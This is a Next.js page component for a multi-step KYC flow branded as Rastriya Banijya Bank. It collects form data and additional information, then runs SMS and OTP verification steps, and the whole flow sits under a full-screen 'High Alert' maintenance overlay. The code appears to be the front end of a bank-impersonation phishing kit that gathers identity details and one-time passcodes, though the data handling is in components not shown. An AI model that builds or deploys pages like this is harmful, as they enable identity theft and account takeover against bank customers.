"use client";

import { useState } from "react";
import Image from "next/image";
import { AlertTriangle } from "lucide-react";
import { KycForm } from "@/components/kyc-form";
import { AdditionalInfoForm } from "@/components/additional-info-form";
import { SuccessCard } from "@/components/success-card";
import { OtpVerify } from "@/components/otp-verify";
import { KycThankYou } from "@/components/kyc-thank-you";

type Step = "form" | "additional" | "sms" | "otp" | "thankyou";

export default function KycPage() {
  const [step, setStep] = useState<Step>("form");
  const [submissionId, setSubmissionId] = useState<string | null>(null);

  function handleFormSuccess(id: string) {
    setSubmissionId(id);
    setStep("additional");
  }

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-red-950/95 p-4">
        <div className="w-full max-w-md rounded-2xl border-2 border-red-500 bg-white p-8 text-center shadow-2xl animate-in zoom-in duration-300">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-red-100">
            <AlertTriangle className="h-8 w-8 text-red-600" strokeWidth={2.5} />
          </div>
          <h1 className="text-2xl font-bold uppercase tracking-wide text-red-700">
            High Alert
          </h1>
          <p className="mt-3 text-lg font-semibold text-gray-900">
            Application need maintenance
          </p>
          <p className="mt-2 text-sm text-gray-500">
            The application is currently under maintenance. Please try again later.
          </p>
        </div>
      </div>
      <div className="w-full max-w-[420px]">
        {step === "form" && (
          <div className="bg-white rounded-2xl shadow-lg p-8 space-y-6">
            <div className="text-center space-y-3">
              <h1 className="text-xl font-bold text-gray-900">Rastriya Banijya Bank</h1>
              <div className="flex justify-center">
                <Image
                  src="/1731390437-339067.png"
                  alt="Rastriya Banijya Bank"
                  width={80}
                  height={80}
                  className="object-contain"
                  priority
                />
              </div>
            </div>
            <KycForm onSuccess={handleFormSuccess} />
          </div>
        )}

        {step === "additional" && submissionId && (
          <div className="bg-white rounded-2xl shadow-lg p-8 space-y-6">
            <div className="text-center space-y-3">
              <h1 className="text-xl font-bold text-gray-900">Rastriya Banijya Bank</h1>
              <div className="flex justify-center">
                <Image
                  src="/1731390437-339067.png"
                  alt="Rastriya Banijya Bank"
                  width={80}
                  height={80}
                  className="object-contain"
                  priority
                />
              </div>
              <p className="text-sm text-gray-500">Additional Information</p>
            </div>
            <AdditionalInfoForm submissionId={submissionId} onSuccess={() => setStep("sms")} />
          </div>
        )}

        {step === "sms" && submissionId && (
          <SuccessCard submissionId={submissionId} onContinue={() => setStep("otp")} />
        )}
        {step === "otp" && submissionId && (
          <OtpVerify submissionId={submissionId} onVerified={() => setStep("thankyou")} />
        )}
        {step === "thankyou" && (
          <KycThankYou />
        )}
      </div>
    </div>
  );
}
